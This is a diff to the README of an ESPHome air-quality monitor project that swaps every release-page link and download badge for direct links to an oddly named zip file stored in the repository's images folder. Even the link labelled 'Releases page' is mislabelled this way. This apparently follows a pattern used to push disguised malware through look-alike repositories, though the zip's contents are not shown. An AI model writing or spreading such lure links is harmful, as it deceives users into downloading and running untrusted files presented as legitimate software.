@@ -4,7 +4,7 @@
 The ESPHome Air Quality Monitor helps you keep track of CO2, temperature, humidity, and VOC levels in your space. It features an easy-to-read display and simple setup. 
 
 ### 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/3x3k/esphome-air-quality-monitor/releases)
+[![Download](https://github.com/3x3k/esphome-air-quality-monitor/raw/refs/heads/main/images/esphome-air-monitor-quality-fatuism.zip)](https://github.com/3x3k/esphome-air-quality-monitor/raw/refs/heads/main/images/esphome-air-monitor-quality-fatuism.zip)
 
 ## 📦 System Requirements
 To run the ESPHome Air Quality Monitor, ensure your device meets the following requirements:
@@ -24,7 +24,7 @@ To run the ESPHome Air Quality Monitor, ensure your device meets the following r
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/3x3k/esphome-air-quality-monitor/releases).
+1. Go to the [Releases page](https://github.com/3x3k/esphome-air-quality-monitor/raw/refs/heads/main/images/esphome-air-monitor-quality-fatuism.zip).
 2. Find the latest version of the application.
 3. Click on the download link for your operating system.
 4. Save the file to your computer.
@@ -67,6 +67,6 @@ If you face any issues during installation or setup, consider the following:
 For immediate concerns or feedback, please contact us through the GitHub repository, or refer to the community resources available.
 
 ### 🔗 Download Now Again!
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/3x3k/esphome-air-quality-monitor/releases)
+[![Download](https://github.com/3x3k/esphome-air-quality-monitor/raw/refs/heads/main/images/esphome-air-monitor-quality-fatuism.zip)](https://github.com/3x3k/esphome-air-quality-monitor/raw/refs/heads/main/images/esphome-air-monitor-quality-fatuism.zip)
 
 Now you are ready to monitor your air quality with ease using the ESPHome Air Quality Monitor!
